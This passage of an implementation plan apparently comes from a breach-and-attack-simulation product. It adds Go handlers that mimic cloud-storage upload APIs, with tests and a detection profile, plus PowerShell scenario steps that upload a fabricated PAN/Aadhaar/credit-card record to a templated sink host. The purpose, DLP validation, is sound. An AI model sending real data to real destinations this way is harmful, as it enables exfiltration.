)

// handleGCSUpload mimics Google Cloud Storage's simple media-upload
// request: the object name is a query parameter, not part of the URL path
// or a header.
func handleGCSUpload(db *pgxpool.Pool) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			host = r.RemoteAddr
		}
		if !limiter.allow(host) {
			w.WriteHeader(http.StatusTooManyRequests)
			return
		}
		token := strings.TrimSuffix(r.URL.Query().Get("name"), ".dat")

		r.Body = http.MaxBytesReader(w, r.Body, MaxUploadBytes)
		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "request entity too large", http.StatusRequestEntityTooLarge)
			return
		}

		if tokenExists(r.Context(), db, token) {
			_ = writeReceipt(r.Context(), db, token, host, "cloud-gcs", body)
		}
		w.WriteHeader(http.StatusOK)
	}
}
```

Update `Routes` in `cloudsink.go`:

```go
	r.Post("/dropbox/2/files/upload", handleDropboxUpload(db))
	r.Post("/gcs/upload/storage/v1/b/{bucket}/o", handleGCSUpload(db))
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/cloudsink/... -v`
Expected: PASS for all tests so far.

- [ ] **Step 5: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/cloudsink/*.go
git add internal/cloudsink/dropbox.go internal/cloudsink/gcs.go internal/cloudsink/dropbox_test.go internal/cloudsink/gcs_test.go internal/cloudsink/cloudsink.go
git commit -m "feat(cloudsink): add Dropbox and Google Storage traffic-shape simulation handlers"
git push
```

---

## Task 5: Google Drive and Box handlers — multipart body parsing

**Files:**
- Create: `orchestrator/internal/cloudsink/gdrive.go`
- Create: `orchestrator/internal/cloudsink/box.go`
- Create: `orchestrator/internal/cloudsink/gdrive_test.go`
- Create: `orchestrator/internal/cloudsink/box_test.go`
- Modify: `orchestrator/internal/cloudsink/cloudsink.go` (register both routes)

**Interfaces:**
- Consumes: same as Task 2.
- Produces: `func handleGDriveUpload(db *pgxpool.Pool) http.HandlerFunc`, `func handleBoxUpload(db *pgxpool.Pool) http.HandlerFunc`.

The most structurally complex two providers: both wrap the token inside a JSON object that is itself one part of a multipart request body. Google Drive uses `multipart/related` (a JSON metadata part + a raw content part); Box uses `multipart/form-data` (an `attributes` JSON part + a `file` part). Go's `mime/multipart.NewReader` parses both generically — it is not specific to `multipart/form-data` despite `mime/multipart.Reader.ReadForm` being a form-data-only convenience wrapper this task does not use.

- [ ] **Step 1: Write the failing tests**

```go
// gdrive_test.go
package cloudsink

import (
	"bytes"
	"fmt"
	"net/http"
	"net/http/httptest"
	"testing"
)

func gdriveMultipartBody(boundary, metadataJSON, content string) string {
	return fmt.Sprintf(
		"--%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n--%s\r\nContent-Type: text/plain\r\n\r\n%s\r\n--%s--",
		boundary, metadataJSON, boundary, content, boundary,
	)
}

func TestGDriveUpload_MatchedTokenRecordsReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5"
		seedToken(t, pool, token, "run-gdrive-1", "T1567.002")

		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		boundary := "bas-sim-boundary"
		metadata := fmt.Sprintf(`{"name":"%s.dat","mimeType":"text/plain"}`, token)
		content := "[BAS-SIM-DLP] test payload"
		bodyStr := gdriveMultipartBody(boundary, metadata, content)

		req, _ := http.NewRequest(http.MethodPost, srv.URL+"/gdrive/upload/drive/v3/files", bytes.NewReader([]byte(bodyStr)))
		req.Header.Set("Content-Type", "multipart/related; boundary="+boundary)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("POST: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("status = %d, want 200", resp.StatusCode)
		}
		assertReceiptRecorded(t, pool, token, "cloud-gdrive", len(content))
	})
}
```

```go
// box_test.go
package cloudsink

import (
	"bytes"
	"fmt"
	"net/http"
	"net/http/httptest"
	"testing"
)

func boxMultipartBody(boundary, attributesJSON, filename, content string) string {
	return fmt.Sprintf(
		"--%s\r\nContent-Disposition: form-data; name=\"attributes\"\r\n\r\n%s\r\n"+
			"--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n%s\r\n--%s--",
		boundary, attributesJSON, boundary, filename, content, boundary,
	)
}

func TestBoxUpload_MatchedTokenRecordsReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "0718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f6"
		seedToken(t, pool, token, "run-box-1", "T1567.002")

		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		boundary := "bas-sim-boundary"
		attrs := fmt.Sprintf(`{"name":"%s.dat","parent":{"id":"0"}}`, token)
		content := "[BAS-SIM-DLP] test payload"
		bodyStr := boxMultipartBody(boundary, attrs, token+".dat", content)

		req, _ := http.NewRequest(http.MethodPost, srv.URL+"/box/2.0/files/content", bytes.NewReader([]byte(bodyStr)))
		req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("POST: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusCreated {
			t.Errorf("status = %d, want 201 (matching real Box upload's own success code)", resp.StatusCode)
		}
		assertReceiptRecorded(t, pool, token, "cloud-box", len(content))
	})
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/cloudsink/... -run "GDrive|Box" -v 2>&1 | head -40`
Expected: FAIL — handlers undefined, routes not registered.

- [ ] **Step 3: Write the implementation**

```go
// gdrive.go
package cloudsink

import (
	"encoding/json"
	"io"
	"mime"
	"mime/multipart"
	"net"
	"net/http"
	"strings"

	"github.com/jackc/pgx/v5/pgxpool"
)

// handleGDriveUpload mimics Google Drive's multipart/related upload
// request: a JSON metadata part (carrying the token as its "name" field)
// followed by the raw content part.
func handleGDriveUpload(db *pgxpool.Pool) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			host = r.RemoteAddr
		}
		if !limiter.allow(host) {
			w.WriteHeader(http.StatusTooManyRequests)
			return
		}

		r.Body = http.MaxBytesReader(w, r.Body, MaxUploadBytes)

		mediaType, params, err := mime.ParseMediaType(r.Header.Get("Content-Type"))
		if err != nil || !strings.HasPrefix(mediaType, "multipart/") {
			w.WriteHeader(http.StatusOK)
			return
		}
		mr := multipart.NewReader(r.Body, params["boundary"])

		var token string
		var content []byte
		for {
			part, err := mr.NextPart()
			if err == io.EOF {
				break
			}
			if err != nil {
				break
			}
			data, _ := io.ReadAll(part)
			if strings.Contains(part.Header.Get("Content-Type"), "application/json") {
				var meta struct {
					Name string `json:"name"`
				}
				if json.Unmarshal(data, &meta) == nil {
					token = strings.TrimSuffix(meta.Name, ".dat")
				}
			} else {
				content = data
			}
		}

		if token != "" && tokenExists(r.Context(), db, token) {
			_ = writeReceipt(r.Context(), db, token, host, "cloud-gdrive", content)
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"id":"bas-sim-id","name":"bas-sim"}`))
	}
}
```

```go
// box.go
package cloudsink

import (
	"encoding/json"
	"io"
	"mime"
	"mime/multipart"
	"net"
	"net/http"
	"strings"

	"github.com/jackc/pgx/v5/pgxpool"
)

// handleBoxUpload mimics Box's multipart/form-data upload request: an
// "attributes" JSON part (carrying the token as its "name" field) plus a
// "file" part.
func handleBoxUpload(db *pgxpool.Pool) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			host = r.RemoteAddr
		}
		if !limiter.allow(host) {
			w.WriteHeader(http.StatusTooManyRequests)
			return
		}

		r.Body = http.MaxBytesReader(w, r.Body, MaxUploadBytes)

		mediaType, params, err := mime.ParseMediaType(r.Header.Get("Content-Type"))
		if err != nil || !strings.HasPrefix(mediaType, "multipart/") {
			w.WriteHeader(http.StatusCreated)
			return
		}
		mr := multipart.NewReader(r.Body, params["boundary"])

		var token string
		var content []byte
		for {
			part, err := mr.NextPart()
			if err == io.EOF {
				break
			}
			if err != nil {
				break
			}
			data, _ := io.ReadAll(part)
			if part.FormName() == "attributes" {
				var attrs struct {
					Name string `json:"name"`
				}
				if json.Unmarshal(data, &attrs) == nil {
					token = strings.TrimSuffix(attrs.Name, ".dat")
				}
			} else if part.FormName() == "file" {
				content = data
			}
		}

		if token != "" && tokenExists(r.Context(), db, token) {
			_ = writeReceipt(r.Context(), db, token, host, "cloud-box", content)
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		_, _ = w.Write([]byte(`{"entries":[{"id":"bas-sim-id","name":"bas-sim"}]}`))
	}
}
```

Update `Routes` in `cloudsink.go`:

```go
	r.Post("/gdrive/upload/drive/v3/files", handleGDriveUpload(db))
	r.Post("/box/2.0/files/content", handleBoxUpload(db))
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/cloudsink/... -v`
Expected: PASS for all tests across every provider (Tasks 1-5 combined).

- [ ] **Step 5: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/cloudsink/*.go
git add internal/cloudsink/gdrive.go internal/cloudsink/box.go internal/cloudsink/gdrive_test.go internal/cloudsink/box_test.go internal/cloudsink/cloudsink.go
git commit -m "feat(cloudsink): add Google Drive and Box traffic-shape simulation handlers"
git push
```

---

## Task 6: Mount `/cloudsink` on the main API router

**Files:**
- Modify: `orchestrator/internal/api/routes.go:1-13` (imports), `:151` (mount point)

**Interfaces:**
- Consumes: `cloudsink.Routes(db *pgxpool.Pool) chi.Router` (Task 1-5).

- [ ] **Step 1: Add the import**

In `orchestrator/internal/api/routes.go`, add to the import block:

```go
	"github.com/audspect/bas/internal/cloudsink"
```

- [ ] **Step 2: Mount the routes**

Immediately after the existing `r.Post("/api/dlp/sink", h.DLPSink)` line (in the "── Public endpoints (no auth) ──" section, before the "── Authenticated endpoints (JWT required) ──" comment):

```go
	// Cloud storage exfiltration channel (internal/cloudsink) -- seven
	// provider-shaped routes mimicking S3/Azure Blob/OneDrive/Google Drive/
	// Dropbox/Google Storage/Box upload requests. Same unauthenticated
	// posture as /api/dlp/sink immediately above: content/protocol
	// inspection is what's being tested, not access control. Mounted here
	// (not a separate listener) because unlike SFTP/SMTP/DNS these are all
	// HTTPS REST APIs -- there is no separate protocol to bind a port for.
	r.Mount("/cloudsink", cloudsink.Routes(h.db))
```

- [ ] **Step 3: Build to verify it compiles**

Run: `cd orchestrator && go build ./... 2>&1`
Expected: clean build, no errors.

- [ ] **Step 4: Verify the mount works end-to-end**

Run: `cd orchestrator && go test ./internal/api/... -run TestMount -v 2>&1 | tail -20`

If no existing `TestMount`-prefixed test exists, this step's purpose is just confirming `go build` (Step 3) already succeeded — the real end-to-end coverage comes from Task 8's scenario-level verification. Skip re-testing here if Step 3 passed cleanly.

- [ ] **Step 5: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/api/routes.go
git add internal/api/routes.go
git commit -m "feat(cloudsink): mount cloud storage sink routes on the main API server"
git push
```

---

## Task 7: Placeholder substitution in `internal/api/dlp_sink.go`

**Files:**
- Modify: `orchestrator/internal/api/dlp_sink.go:100-176` (add branch + two new functions)
- Modify: `orchestrator/internal/api/dlp_sink_test.go` (append tests)

**Interfaces:**
- Consumes: nothing new — reuses the existing unconditional `{{SINK_TOKEN}}` block.
- Produces: `func cloudSinkHost(publicBaseURL string) string`, `func cloudSinkPort(publicBaseURL string) string`.

- [ ] **Step 1: Write the failing tests**

Append to `orchestrator/internal/api/dlp_sink_test.go`:

```go
func TestIssueSinkTokensAndSubstitute_CloudPlaceholders(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1567.002", Command: "$uri = 'https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/s3/bas-sim-bucket/{{SINK_TOKEN}}.dat'"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-cloud-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		cmd := out[0].Command
		if strings.Contains(cmd, "{{SINK_TOKEN}}") || strings.Contains(cmd, "{{SINK_CLOUD_HOST}}") || strings.Contains(cmd, "{{SINK_CLOUD_PORT}}") {
			t.Fatalf("cloud storage placeholders not fully substituted: %s", cmd)
		}
		if !strings.Contains(cmd, "orchestrator.example") {
			t.Fatalf("expected the bare host in the command: %s", cmd)
		}
		if !strings.Contains(cmd, ":9443/") {
			t.Fatalf("expected SINK_CLOUD_PORT to be derived from publicBaseURL's own port (9443): %s", cmd)
		}

		var tokenLen int
		if err := pool.QueryRow(context.Background(),
			`SELECT length(token) FROM dlp_sink_tokens WHERE run_id = 'run-cloud-1' AND technique_id = 'T1567.002'`,
		).Scan(&tokenLen); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if tokenLen != 64 {
			t.Fatalf("token length = %d, want 64 (cloud storage reuses the existing 32-byte/64-hex-char token, not a new byte-length variant)", tokenLen)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_CloudDoesNotIssueOrphanedSecondToken(t *testing.T) {
	// Regression: the cloud-storage placeholder block must NOT generate its
	// own {{SINK_TOKEN}} -- guards against the same class of bug SFTP's
	// implementation had to fix mid-stream, applied here from the start
	// like SMTP already did.
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1567.002", Command: "$uri = 'https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/s3/bas-sim-bucket/{{SINK_TOKEN}}.dat'"},
		}
		if _, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-cloud-orphan", "https://orchestrator.example:9443", steps); err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-cloud-orphan' AND technique_id = 'T1567.002'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows = %d, want exactly 1 (no orphaned second token from the cloud storage block)", count)
		}
	})
}

func TestCloudSinkPort_DerivesFromPublicBaseURL(t *testing.T) {
	cases := []struct{ in, want string }{
		{"https://orchestrator.example:9443", "9443"},
		{"https://10.0.0.5:8443", "8443"},
		{"https://orchestrator.example", "443"}, // no explicit port -- assume default HTTPS
	}
	for _, c := range cases {
		got := cloudSinkPort(c.in)
		if got != c.want {
			t.Errorf("cloudSinkPort(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestCloudSinkHost_HonorsExplicitOverride(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	t.Setenv("SINK_CLOUD_HOST", "cloud-external.example.net")
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1567.002", Command: "target={{SINK_CLOUD_HOST}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-cloud-2", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		if !strings.Contains(out[0].Command, "cloud-external.example.net") {
			t.Fatalf("expected the SINK_CLOUD_HOST override to win over the derived publicBaseURL host: %s", out[0].Command)
		}
	})
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/api/... -run Cloud -v 2>&1 | head -40`
Expected: FAIL — `cloudSinkHost`/`cloudSinkPort` undefined, placeholders unsubstituted.

- [ ] **Step 3: Write the implementation**

In `orchestrator/internal/api/dlp_sink.go`, add a new branch to `issueSinkTokensAndSubstitute` immediately after the existing SMTP branch (after its closing `}`):

```go
		if strings.Contains(steps[i].Command, "{{SINK_CLOUD_HOST}}") || strings.Contains(steps[i].Command, "{{SINK_CLOUD_PORT}}") {
			// Same reasoning as the SFTP/SMTP blocks above: does NOT issue
			// its own token. Cloud storage reuses the existing 32-byte
			// {{SINK_TOKEN}} placeholder directly, and every real
			// cloud-storage-wired step's command contains {{SINK_TOKEN}}
			// too (embedded in its provider-specific object key/path) --
			// the unconditional block above already issues and substitutes
			// it whenever present.
			steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_CLOUD_HOST}}", cloudSinkHost(publicBaseURL))
			steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_CLOUD_PORT}}", cloudSinkPort(publicBaseURL))
		}
```

Add the two new helper functions after `smtpSinkPort`:

```go
// cloudSinkHost resolves the {{SINK_CLOUD_HOST}} placeholder: an explicit
// SINK_CLOUD_HOST environment override if set, otherwise the same
// derivation dnsServerHost/sftpSinkHost/smtpSinkHost already use -- no new
// derivation logic.
func cloudSinkHost(publicBaseURL string) string {
	if v := os.Getenv("SINK_CLOUD_HOST"); v != "" {
		return v
	}
	return dnsServerHost(publicBaseURL)
}

// cloudSinkPort resolves the {{SINK_CLOUD_PORT}} placeholder. Unlike
// sftpSinkPort/smtpSinkPort -- each defaulting to a *configured* value
// because SFTP/SMTP each bind their own independent, independently-
// configurable port -- cloud storage's routes live on the main API
// server's own port, so there is no independent bind to configure.
// Defaulting to a hardcoded value would be wrong whenever the externally-
// reachable port differs from any container-internal one (a reverse proxy
// mapping 443 -> 9443, for instance); instead this extracts the port
// directly from publicBaseURL, the same URL every request to reach this
// orchestrator already uses. SINK_CLOUD_PORT remains available as an
// explicit override for the rare case where cloud storage's routes are
// deliberately reachable on a different externally-published port than the
// rest of the API.
func cloudSinkPort(publicBaseURL string) string {
	if v := os.Getenv("SINK_CLOUD_PORT"); v != "" {
		return v
	}
	if u, err := url.Parse(publicBaseURL); err == nil && u.Port() != "" {
		return u.Port()
	}
	return "443" // publicBaseURL has no explicit port -- assume default HTTPS
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/api/... -run Cloud -v`
Expected: PASS for all 4 new tests.

- [ ] **Step 5: Run the full `internal/api` suite to confirm no regressions**

Run: `cd orchestrator && go test ./internal/api/...`
Expected: PASS, including all existing HTTPS/DNS/SFTP/SMTP placeholder tests unchanged.

- [ ] **Step 6: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/api/dlp_sink.go internal/api/dlp_sink_test.go
git add internal/api/dlp_sink.go internal/api/dlp_sink_test.go
git commit -m "feat(cloudsink): add SINK_CLOUD_HOST/PORT placeholder substitution"
git push
```

---

## Task 8: V1 scenario content — seven providers

**Files:**
- Create: `orchestrator/scenarios/dlp-exfiltration-cloud-storage.yaml`
- Create: `orchestrator/scenarios/dlp-exfiltration-cloud-storage.yaml.sig`
- Modify: `orchestrator/scenarios/detection-profiles/windows_dlp_exfiltration.yaml`
- Modify: `orchestrator/scenarios/detection-profiles/windows_dlp_exfiltration.yaml.sig`

- [ ] **Step 1: Add the detection-profile entry**

In `orchestrator/scenarios/detection-profiles/windows_dlp_exfiltration.yaml`, add `T1567.002` to the
top-level `technique_ids` list (alongside the existing entries), and append a new entry to
`expected_detection` after the existing `dlp-smtp-block` entry:

```yaml
  - id: dlp-cloud-storage-block
    provider: trellix_dlp
    type: dlp
    outcome_family: dlp
    expected_outcome: Block
    verification: automatic
    confidence: required
    finding:
      severity: High
      title: "DLP/CASB controls did not block cloud-storage-shaped exfiltration of regulated data"
      remediation: >-
        Confirm DLP/CASB content inspection recognizes and inspects
        traffic shaped like S3, Azure Blob, OneDrive, Google Drive,
        Dropbox, Google Storage, and Box upload requests (destination
        path structure, vendor-specific headers, and body/content-type
        shape) for PAN/Aadhaar/SWIFT/UPI/credit-card patterns, and
        blocks the upload rather than allowing it to complete.
      reference: "MITRE ATT&CK T1567.002 — Exfiltration to Cloud Storage"
```

- [ ] **Step 2: Write the scenario**

```yaml
id: dlp-exfiltration-cloud-storage
name: DLP Exfiltration Validation — Cloud Storage Channels
description: >
  Attempts to exfiltrate the same synthetic multi-type sensitive record
  used by every other channel in this program (fabricated PAN, Aadhaar,
  SWIFT/BIC, UPI VPA, and credit-card patterns), this time shaped as
  upload requests to seven distinct cloud-storage providers: AWS S3,
  Azure Blob Storage, Microsoft OneDrive (Graph API), Google Drive,
  Dropbox, Google Cloud Storage, and Box.

  Fifth channel of the sink-verified generation of DLP testing (see
  docs/superpowers/specs/2026-09-01-cloud-storage-exfiltration-channel-design.md).
  Each step's verdict comes from whether the platform's own
  provider-shaped route (internal/cloudsink) ever receives a request
  whose embedded token matches this run -- ground truth resolved
  server-side, never from anything the step's own script can locally
  confirm.

  Fidelity: each step reproduces its provider's real path structure, HTTP
  method, vendor-specific headers, and body/content-type shape closely
  enough for a DLP/CASB product's traffic recognition to identify it --
  but does NOT implement real cryptographic request signing (no SigV4,
  no Azure SAS, no OAuth). Without real signing these are traffic-shape
  simulations, not authenticated requests against the real vendor --
  every step name and comment says so explicitly, never claiming to be
  "AWS traffic" or "real OneDrive traffic."

  Safety: all synthetic data is fabricated ([BAS-SIM-DLP] tagged), never
  real. Every sink stores only a hash of the received payload, never the
  raw content. Every destination is this same on-prem orchestrator's own
  main API server -- no external cloud account, bucket, or destination
  is ever contacted. Windows only.
author: Audspect Research
executable: true
supported_os: [windows]
tags:
  - dlp
  - data-protection-validation
  - exfiltration
  - cloud-storage
  - windows
  - mitre-attack
  - bfsi
  - india
mitre_phases:
  - collection
  - exfiltration

steps:

  # ---------------------------------------------------------------------------
  # Provider 1 — AWS S3-compatible traffic simulation
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — S3-Compatible Traffic Simulation (T1567.002)"
    technique_id: T1567.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "PUTs a synthetic multi-type sensitive record to the platform's own S3-compatible-shaped endpoint (this same on-prem orchestrator). No real AWS account, no real S3 bucket, no external destination -- this is a traffic-shape simulation only, not an authenticated S3 request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: S3-shaped HTTPS PUT (path structure, x-amz-* headers) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/s3/bas-sim-bucket/$token.dat"
      try {
        Invoke-RestMethod -Uri $uri -Method Put -Body $csvContent `
          -Headers @{ 'x-amz-content-sha256' = 'UNSIGNED-PAYLOAD'; 'x-amz-date' = (Get-Date).ToUniversalTime().ToString('yyyyMMddTHHmmssZ') } `
          -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: s3_put_result=success"
        Write-Output "EXEC T1567.002: S3-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-S3]"
      } catch {
        Write-Output "DLP_OBSERVATION: s3_put_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.002: S3-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-S3]"
      }
      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
      # graded verdict comes entirely from whether the cloud-storage sink
      # actually received a request with a matching token, resolved
      # server-side by internal/cloudsink + internal/verifysync +
      # internal/reporting's sink-primary dlpVerifier, never from this
      # script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Provider 2 — Azure Blob-compatible traffic simulation
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — Azure Blob-Compatible Traffic Simulation (T1567.002)"
    technique_id: T1567.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "PUTs a synthetic multi-type sensitive record to the platform's own Azure-Blob-compatible-shaped endpoint (this same on-prem orchestrator). No real Azure account, no real storage account, no external destination -- traffic-shape simulation only, not an authenticated Azure request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: Azure-Blob-shaped HTTPS PUT (path structure, x-ms-* headers) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/azureblob/bas-sim-container/$token.dat"
      try {
        Invoke-RestMethod -Uri $uri -Method Put -Body $csvContent `
          -Headers @{ 'x-ms-version' = '2021-08-06'; 'x-ms-blob-type' = 'BlockBlob' } `
          -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: azureblob_put_result=success"
        Write-Output "EXEC T1567.002: Azure Blob-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-AZUREBLOB]"
      } catch {
        Write-Output "DLP_OBSERVATION: azureblob_put_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.002: Azure Blob-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-AZUREBLOB]"
      }
      # See the S3 step above for why this step's graded verdict never
      # comes from this script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Provider 3 — OneDrive (Microsoft Graph)-compatible traffic simulation
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — OneDrive (Graph API)-Compatible Traffic Simulation (T1567.002)"
    technique_id: T1567.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "PUTs a synthetic multi-type sensitive record to the platform's own Graph-API-shaped endpoint (this same on-prem orchestrator). No real Microsoft 365 account, no real OneDrive, no external destination -- traffic-shape simulation only, not an authenticated Graph request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: Microsoft-Graph-shaped HTTPS PUT (upload-by-path structure) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/graph/v1.0/me/drive/root:/$token.dat:/content"
      try {
        Invoke-RestMethod -Uri $uri -Method Put -Body $csvContent -ContentType 'text/plain' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: onedrive_put_result=success"
        Write-Output "EXEC T1567.002: OneDrive-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-ONEDRIVE]"
      } catch {
        Write-Output "DLP_OBSERVATION: onedrive_put_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.002: OneDrive-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-ONEDRIVE]"
      }
      # See the S3 step above for why this step's graded verdict never
      # comes from this script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Provider 4 — Google Drive-compatible traffic simulation
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — Google Drive-Compatible Traffic Simulation (T1567.002)"
    technique_id: T1567.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic multi-type sensitive record to the platform's own Drive-API-shaped endpoint (this same on-prem orchestrator). No real Google account, no real Drive, no external destination -- traffic-shape simulation only, not an authenticated Drive API request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: Google-Drive-shaped multipart HTTPS POST content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
